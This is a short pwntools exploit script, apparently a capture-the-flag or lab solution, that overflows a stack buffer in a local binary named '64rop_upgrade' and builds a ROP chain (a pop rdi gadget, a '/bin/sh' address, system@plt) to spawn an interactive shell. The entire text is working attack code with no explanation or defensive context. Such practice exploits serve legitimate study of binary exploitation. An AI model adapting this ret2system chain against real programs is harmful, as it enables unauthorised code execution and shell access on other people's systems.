from pwn import *
# context.log_level = 'debug'

pop_rdi = 0x400753
binsh   = 0x4007E5

r = process(argv=['./64rop_upgrade','backdoor'])

e = ELF('./64rop_upgrade')

system_plt = e.plt['system']
payload = 'a'*0x18 + p64(pop_rdi) + p64(binsh) + p64(system_plt)


# r.recvuntil('here >')
r.sendline(payload)
r.interactive()
